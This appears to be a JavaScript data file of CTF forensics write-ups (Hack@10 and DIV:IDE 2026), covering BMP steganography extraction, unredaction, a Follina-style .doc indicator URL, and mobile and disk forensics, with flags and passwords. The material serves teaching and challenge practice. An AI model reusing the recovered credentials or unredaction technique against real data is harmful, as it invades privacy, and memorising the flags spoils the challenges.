import struct

bmp_file = "UNITENLogo.bmp"
output_zip = "recovered-files.zip"

with open(bmp_file, "rb") as f:
    bmp_data = f.read()

pixel_offset = struct.unpack_from("<I", bmp_data, 10)[0]
pixel_data = bmp_data[pixel_offset:]

zip_payload = bytearray()
i = 0

while len(zip_payload) < 4:
    zip_payload.extend(pixel_data[i + 2:i + 4])
    i += 4

zip_len = struct.unpack("<I", zip_payload[:4])[0]
total_len = 4 + zip_len

if total_len % 2 != 0:
    total_len += 1

while len(zip_payload) < total_len:
    zip_payload.extend(pixel_data[i + 2:i + 4])
    i += 4

zip_data = zip_payload[4:4 + zip_len]

with open(output_zip, "wb") as f:
    f.write(zip_data)
\`\`\`

Then attempt to open the recovered ZIP with **7-Zip**:

\`\`\`bash
python3 extract_zip.py
7z x recovered-files.zip
\`\`\`

![Terminal showing python3 extract_zip.py followed by 7z x recovered-files.zip — password prompt appears, Everything is Ok, 2 files extracted](assets/images/Forensics/Grid-Transfer-Error/5.png)

7-Zip prompts for a password. I focused on recovering the password manually from the BMP file using HxD. By inspecting the pixel data region, I noticed a different byte pattern starting after the ZIP payload. Based on the structure observed earlier, the TXT payload follows a \`[4 bytes data][4 bytes junk]\` pattern. 

Final password extracted from HxD by taking the first 4 bytes of each 8-byte group:

\`\`\`
Un1t3n_ThUnd3rzst0rm
\`\`\`

Extraction succeeds: **1 folder, 2 files, 21,809 bytes total**.

---

## Step 4: Examining the Extracted Files

Navigate into the extracted folder:

\`\`\`bash
cd UNITEN/
ls
\`\`\`

![Terminal showing cd UNITEN and ls — two files: uniten-song2.0.txt and uniten-song.txt](assets/images/Forensics/Grid-Transfer-Error/6.png)

Two files:
- \`uniten-song.txt\`
- \`uniten-song2.0.txt\`

Both appear to be lyrics for the UNITEN university anthem. Run a hash check to confirm they are not identical:

\`\`\`bash
sha256sum *
\`\`\`

![Terminal showing sha256sum output — both files have different hashes confirming they differ](assets/images/Forensics/Grid-Transfer-Error/7.png)

The hashes are different. The files look similar but are not the same.

---

## Step 5: Comparing the Two Song Files

Open both files side by side in a text editor.

![Side-by-side comparison of uniten-song.txt (left, clean lyrics) and uniten-song2.0.txt (right, highlighted with three extra music lines)](assets/images/Forensics/Grid-Transfer-Error/8.png)

\`uniten-song.txt\` on the left is clean — just standard song lyrics. \`uniten-song2.0.txt\` on the right contains everything from the first file, plus **three extra lines** tagged with \`(music)\` interspersed between the lyric stanzas:

\`\`\`
Fc1Z^gWRblj (music)
<p$P>:Evwd;dM@Tf-, (music)
?X1Gd&3lHd,5#x8+c7( (music)
\`\`\`

These are not real musical notations. They are cipher text.

---

## Step 6: Identifying the Cipher

Extract the three suspicious strings and combine them:

\`\`\`
Fc1Z^gWRblj<p$P>:Evwd;dM@Tf-,?X1Gd&3lHd,5#x8+c7(
\`\`\`

Paste this into the **dCode Cipher Identifier** at [dcode.fr/cipher-identifier](https://dcode.fr/cipher-identifier).

![dCode.fr Cipher Identifier showing the combined music string pasted in — top result is Base 92 Encoding with a strong match](assets/images/Forensics/Grid-Transfer-Error/9.png)

The analyser's top suggestion with the strongest confidence bar is **Base 92 Encoding**.

---

## Step 7: Decoding with Base 92

Go to **dCode's Base 92 Decoder** at [dcode.fr/base92-encoding](https://dcode.fr/base92-encoding), paste the combined string, and click **Decrypt**.

![dCode.fr Base 92 Decoder showing the music string input and decoded result: hack10{We_l0vE_uniten_pusAk@_t3rSay4ng}](assets/images/Forensics/Grid-Transfer-Error/10.png)

The decoded output is:

\`\`\`
hack10{We_l0vE_uniten_pusAk@_t3rSay4ng}
\`\`\`

---

## How It All Connected

\`\`\`
UNITENLogo.bmp
    │
    ├─ Pixel data offset 0x8A — not real pixels
    │
    ├─ Pattern 1: [2 BMP][2 ZIP][2 BMP][2 ZIP]...
    │       ↓ skip 2, take 2, repeat
    │   recovered-files.zip  (1,425 bytes, password-protected)
    │
    └─ Pattern 2: [4 TXT][4 junk][4 TXT][4 junk]...
            ↓ take 4, skip 4, repeat
        recovered_note.txt  → password: Un1t3n_ThUnd3rzst0rm
                │
                ↓ 7z x recovered-files.zip -p[password]
            UNITEN/
            ├── uniten-song.txt       ← clean reference file
            └── uniten-song2.0.txt    ← 3 extra (music) lines
                    │
                    ↓ extract cipher strings, combine
                Fc1Z^gWRblj<p$P>:Evwd;dM@Tf-,?X1Gd&3lHd,5#x8+c7(
                    │
                    ↓ dCode Cipher Identifier → Base 92
                    ↓ dCode Base 92 Decoder
                FLAG: hack10{We_l0vE_uniten_pusAk@_t3rSay4ng}
\`\`\`

## Key Takeaways

- **BMP pixel data is a flexible steganography carrier.** Because BMP stores raw, uncompressed pixels, any bytes can be injected into the pixel region without breaking the file header. The image still opens normally as long as the header is untouched.
- **Two different interleaving patterns in one file.** The ZIP and TXT payloads used different skip/take patterns, requiring separate extraction logic for each. Reading the pixel data as one flat stream and knowing where each scheme starts is the key.
- **The password and the ciphertext were in separate layers.** The TXT note held the ZIP password, and the ZIP held the ciphertext. Neither was useful alone — both extractions were required.
- **Hash comparison is a quick way to spot differences.** When two files look identical at a glance, \`sha256sum\` immediately confirms whether they actually differ, saving time on manual line-by-line reading.
- **dCode's Cipher Identifier is invaluable** when the encoding is not immediately obvious. Pasting the ciphertext and letting the analyser rank candidates saved significant time here.

## Flag

\`hack10{We_l0vE_uniten_pusAk@_t3rSay4ng}\`
    `,
  },
    
  {
    id:         'hack10-2026-alphazer0',
    title:      'AlphaZer0',
    ctf:        'Hack@10 International CTF 2026',
    category:   'Misc',
    difficulty: 'Hard',
    points:     null,
    date:       'April 2026',
    summary:    'A redacted string in an image is recovered using the BishopFox unredacter tool from GitHub.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Alphazer0/question.png)

We are given an image with a redacted string. The mission is to unredact it and recover the hidden key.

![Redacted secret](assets/images/Forensics/Alphazer0/secret.png)

## Step 1: Research Unredaction Tools

After some research, the **unredacter** tool by BishopFox is found on GitHub:

![GitHub repo](assets/images/Forensics/Alphazer0/github.png)

> [https://github.com/BishopFox/unredacter](https://github.com/BishopFox/unredacter)

This tool reverses pixelated/redacted text by brute-forcing likely characters based on pixel patterns.

## Step 2: Run the Tool

Follow the setup instructions in the repo and run the tool against the provided image. The tool successfully recovers the redacted text.

![Recovered flag](assets/images/Forensics/Alphazer0/flag.png)

## Flag

\`hack10{unitenthunders}\`
    `,
  },

  {
    id:         'Hack@10-2026-malware-or-not',
    title:      'Malware or not?',
    ctf:        'Hack@10 International CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'A suspicious .doc file is analysed for macros and embedded content. Inspecting the document relationships file exposes a Follina-style (CVE-2022-30190) external URL as the IoC flag.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Malware-Or-Not/question.png)

We are given a \`.doc\` file suspected of being a malware sample. The goal is to analyse it and find indicators of compromise (IoC).

## Step 1: Check for Macros

Use \`olevba\` to inspect the \`.doc\` file for any embedded macros:

\`\`\`bash
olevba malware.doc
\`\`\`

![olevba output](assets/images/Forensics/Malware-Or-Not/olevba.png)

No macros are detected.

## Step 2: Extract Document Contents

A \`.doc\` file is a ZIP-like container with XML files. Extract them for further analysis:

\`\`\`bash
unzip malware.doc -d extracted/
\`\`\`

![Extracted contents](assets/images/Forensics/Malware-Or-Not/extract.png)

## Step 3: Check for External Links (Follina — CVE-2022-30190)

Inspect the relationships file for external links:

\`\`\`bash
cat extracted/word/_rels/document.xml.rels
\`\`\`

![document.xml.rels](assets/images/Forensics/Malware-Or-Not/flag.png)

A suspicious external URL is found — a known IoC pattern consistent with the **Follina** vulnerability:

\`\`\`
https://happy.divide.cloud/nowyouknow.html
\`\`\`

## Flag

\`hack10{https://happy.divide.cloud/nowyouknow.html}\`
    `,
  },


  // ================================================================
  // DIV:IDE CTF 2026 — FORENSICS
  // ================================================================

  {
    id:         'divide-2026-cant-let-go',
    title:      "Can't Let Go",
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'An .eml email attachment hides a multi-layered archive with misidentified file extensions, leading to a two-part flag hidden in images and a password-protected PDF.',

    content: `
## Challenge Description

![Challenge](assets/images/Forensics/Cant-Let-Go/question.png)

We are given an \`.eml\` file. The goal is to find the hidden flag inside the attachments sent via email.

## Step 1: Open the Email

Open the \`.eml\` file using Outlook. The email contains an attachment named \`memories.pdf\`.

![Email](assets/images/Forensics/Cant-Let-Go/email.png)

## Step 2: Verify the Attachment

Attempting to open \`memories.pdf\` directly fails. Upon inspection, it turns out the file is not a true PDF but actually a 7z archive.

![File inspection](assets/images/Forensics/Cant-Let-Go/file.png)

Rename the file extension from \`.pdf\` to \`.7z\`.

## Step 3: Extract the Archive

Extract \`memories.7z\`. After extraction, we get a folder named \`flag\` containing:

1. \`letter.txt\`
2. \`loveYou.txt\`
3. \`ourPic\`
4. \`pantai.png\`

![Archive contents](assets/images/Forensics/Cant-Let-Go/list.png)

## Step 4: Identify Correct File Extensions

Some files have incorrect extensions. After fixing them:

1. \`ourPic.png\`
2. \`loveYou.7z\`
3. \`letter.png\`
4. \`pantai.png\`

## Step 5: Examine Files

### ourPic.png

Opening \`ourPic.png\` reveals the first part of the flag:

![ourPic](assets/images/Forensics/Cant-Let-Go/ourPic.png)

> part1: \`divide{HoP3_wE_c4N_Be_bACk\`

### letter.png

\`letter.png\` contains a password: \`theMoonisBeuty\`

![letter](assets/images/Forensics/Cant-Let-Go/letter.png)

This password will be used for \`loveYou.7z\`.

### pantai.png

No flag here — just a context image.

![pantai](assets/images/Forensics/Cant-Let-Go/pantai.png)

## Step 6: Extract loveYou.7z

Use the password \`theMoonisBeuty\` to extract \`loveYou.7z\`. Inside there is a PDF file.

![Flag PDF](assets/images/Forensics/Cant-Let-Go/flagpdf.png)

Opening the PDF appears blank, but selecting all text (**CTRL + A**) reveals the second part of the flag hidden at the bottom:

![Part 2](assets/images/Forensics/Cant-Let-Go/part2.png)

> part2: \`_AS_B3Fore_i_miss_you_Say4ng}\`

## Flag

\`divide{HoP3_wE_c4N_Be_bACk_AS_B3Fore_i_miss_you_Say4ng}\`
    `,
  },

  {
    id:         'divide-2026-kelajuan-aka-speed',
    title:      'Kelajuan aKa Speed',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'Binary strings hidden in an image decode to a steghide password, revealing a secret file with the flag.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Kelajuan-aKa-Speed/question.png)

We are given an image containing binary strings hidden across it. The goal is to extract the hidden flag.

![Image](assets/images/Forensics/Kelajuan-aKa-Speed/kelajuan.jpg)

## Step 1: Extract Binary Strings

The image contains the following binary strings:

\`\`\`
00110001 01110011 01101000 00110000 01110111 01110011 01110000 01100101 01000101 01100100
\`\`\`

## Step 2: Decode Binary

Using CyberChef, decode the binary string:

\`\`\`
1sh0wspeEd
\`\`\`

## Step 3: Extract Hidden File

Use \`steghide\` to extract the hidden file from the image using the password \`1sh0wspeEd\`:

\`\`\`bash
steghide extract -sf kelajuan.jpg -p 1sh0wspeEd
\`\`\`

![Steghide extraction](assets/images/Forensics/Kelajuan-aKa-Speed/secret.png)

The extraction produces a file named \`secret.txt\`. Reading it reveals the flag.

![Flag](assets/images/Forensics/Kelajuan-aKa-Speed/flag.png)

## Flag

\`divide{Ish0wsPe3d_1s_tHe_9re4tEst_str3@meR}\`
    `,
  },

  {
    id:         'divide-2026-open-your-eyes',
    title:      'Open Your Eyes',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'A PDF hides an embedded WAV file whose spectrogram reveals a password for a 7z archive. The extracted PNG contains a two-part flag.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Open-Your-Eyes/question.png)

We are given two files: \`file.pdf\` and \`Flag.7z\`. The goal is to find the password hidden in the PDF to extract the archive and retrieve the flag.

## Step 1: Inspect the PDF

Opening \`file.pdf\` shows a picture of Plankton with text like "Tuut Tut". Decoding the text directly yields nothing.

![PDF](assets/images/Forensics/Open-Your-Eyes/pdf.png)

## Step 2: Check for Embedded Files

Use \`binwalk\` to check for hidden or appended files:

\`\`\`bash
binwalk file.pdf
\`\`\`

![Binwalk output](assets/images/Forensics/Open-Your-Eyes/binwalk.png)

There is a \`.wav\` file appended at the end of the PDF.

## Step 3: Extract the Audio

Extract the embedded WAV file manually using \`binwalk -e\` or \`dd\`.

![Extraction](assets/images/Forensics/Open-Your-Eyes/extract.png)

## Step 4: Analyze the Audio

Listening to the WAV file suggests it contains a hidden message using sound patterns. Open the file in **Audacity** and switch to *Spectrogram* view.

![Spectrogram](assets/images/Forensics/Open-Your-Eyes/spec.png)

Readable strings appear in the spectrogram, revealing the password for \`Flag.7z\`:

\`\`\`
D1VIDE/WB
\`\`\`

## Step 5: Extract the 7z Archive

\`\`\`bash
7z x Flag.7z -pD1VIDE/WB
\`\`\`

Extraction produces \`flag.png\`. Opening it shows the first part of the flag:

![Flag part 1](assets/images/Forensics/Open-Your-Eyes/flag1.png)

> part1: \`divide{@m_1_th3_\`

## Step 6: Retrieve the Second Part

Run \`strings\` on \`flag.png\` to find the second part:

\`\`\`bash
strings flag.png
\`\`\`

![Flag part 2](assets/images/Forensics/Open-Your-Eyes/flag2.png)

> part2: \`0nlY_@Ne_W4it1ng?}\`

## Flag

\`divide{@m_1_th3_0nlY_@Ne_W4it1ng?}\`
    `,
  },

  {
    id:         'divide-2026-something-left-behind',
    title:      'Something Left Behind',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'Mobile forensics challenge on a Samsung S21 artifact — analysing WhatsApp messages and Chrome history to recover credentials and access a hacker portal.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Something-Left-Behind/question.png)

We are given an extracted artifact from a **Samsung S21** device. The goal is to investigate the artifact and retrieve the hidden flag.

## Step 1: Inspect the Artifact

The extracted artifact contains multiple files and directories from the device.

![Artifact](assets/images/Forensics/Something-Left-Behind/samsung.png)

We focus on application data:

\`\`\`
Artifact1\\Samsung_S21\\data\\app
\`\`\`

## Step 2: Analyze WhatsApp Database

In the WhatsApp app folder, locate the database \`msgstore\`:

\`\`\`
Artifact1\\Samsung_S21\\data\\app\\com.whatsapp\\databases
\`\`\`

The conversation between **AkaN4M1** and **J1ngP0la** reveals:

- They are part of a hacker group
- There is a web portal for their operations
- AkaN4M1 forgot his login password, and J1ngP0la provides a hint

![WhatsApp messages](assets/images/Forensics/Something-Left-Behind/message.png)

From the conversation we construct the portal credentials:

\`\`\`
Username: AkaN4M1
Password: po904$2!
\`\`\`

## Step 3: Check Chrome Browser History

Investigate Chrome history to find relevant URLs.

![Chrome history](assets/images/Forensics/Something-Left-Behind/history.png)

A suspicious URL is found:

\`\`\`
https://alphazer0.divide.cloud/ops0-1.zip
\`\`\`

## Step 4: Access the Portal

Visit the portal and log in using the extracted credentials.

![Login](assets/images/Forensics/Something-Left-Behind/website.png)

The dashboard shows uploaded files.

![Dashboard](assets/images/Forensics/Something-Left-Behind/dashboard.png)

Download the file \`ops0-1.zip\` to retrieve the flag.

## Conclusion

This challenge tested skills in:

- Mobile device forensics (Samsung S21)
- Application data analysis (WhatsApp messages, Chrome history)
- Credential recovery from artifacts
- Investigating suspicious URLs and retrieving files from web portals

## Flag

\`divide{Alphazer0_W3_cAmE_WE_s@W_we_Sh4RE!}\`
    `,
  },

  {
    id:         'divide-2026-alien-is-our-friend',
    title:      'Alien Is Our Friend',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'A WAV audio file carries an SSTV (Slow-Scan Television) signal. Decoding it with an online decoder reveals an image containing the flag.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Alien-Is-Our-Friend/question.png)

We are given a \`.wav\` audio file. The goal is to decode the hidden message transmitted as an SSTV (Slow-Scan Television) signal.

## Step 1: Analyze the Audio

Listening to the \`.wav\` file confirms it contains SSTV signals rather than normal audio. SSTV is a method used to transmit images via sound.

## Step 2: Decode the SSTV Signal

Use an online SSTV decoder to process the audio:

> [https://sstv-decoder.mathieurenaud.fr/](https://sstv-decoder.mathieurenaud.fr/)

Upload the \`.wav\` file and let the decoder process the signal.

## Step 3: Retrieve the Image

After decoding, the SSTV signal reveals an image with the flag visible inside it.

![SSTV decoded](assets/images/Forensics/Alien-Is-Our-Friend/sstv.png)

![Flag](Forensics/Alien-Is-Our-Friend/flag.png)

## Flag

\`divide{Now_you_know_about_SSTV}\`
    `,
  },

  {
    id:         'divide-2026-unusual-incident',
    title:      'Unusual Incident',
    ctf:        'DIV:IDE CTF 2026',
    category:   'Forensics',
    difficulty: 'Easy',
    points:     null,
    date:       'April 2026',
    summary:    'A VMDK file analysed in Autopsy reveals a text file with a Vigenère-encrypted partial flag and a Morse code key. A second part is hidden in a saved picture.',

    content: `
## Challenge Overview

![Challenge](assets/images/Forensics/Unusual-Incident/question.png)

We are given a \`vmdk\` file to investigate for a hidden flag.

## Step 1: Open in Autopsy

Load the VMDK in **Autopsy** and navigate to:

\`\`\`
vol_vol6/Users/User/Documents
\`\`\`

A suspicious file \`letgo.txt\` is found containing:

![letgo.txt contents](assets/images/Forensics/Unusual-Incident/flag1.png)

\`\`\`
key= iloveuniten
ltjdhy{L0ck_Jbz3ygdGm
...- .. --. . -. . .-. . -.-. .. .--. .... . .-.
\`\`\`

## Step 2: Decode the Morse Code

Decode the Morse code using CyberChef:

![Morse decode](assets/images/Forensics/Unusual-Incident/morse.png)

\`\`\`
VIGENERECIPHER
\`\`\`

This confirms the cipher used on the second line.

## Step 3: Decode the Vigenère Cipher

Decrypt \`ltjdhy{L0ck_Jbz3ygdGm\` using the key \`iloveuniten\` in CyberChef:

![Vigenère decode](assets/images/Forensics/Unusual-Incident/decode.png)

> part1: \`divide{Y0ur_For3nsiCs\`

## Step 4: Find Part 2

Navigate to:

\`\`\`
vol_vol6/Users/User/Pictures/Saved Pictures
\`\`\`

An image there reveals the second part of the flag:

![Part 2](assets/images/Forensics/Unusual-Incident/flag2.png)

> part2: \`_Sk!lLs_1s_7Op_N0tcH!}\`

## Flag

\`divide{Y0ur_For3nsiCs_Sk!lLs_1s_7Op_N0tcH!}\`
    `,
  },

  // ================================================================
  // EXAMPLE WRITEUPS (replace or remove as needed)
  // ================================================================

];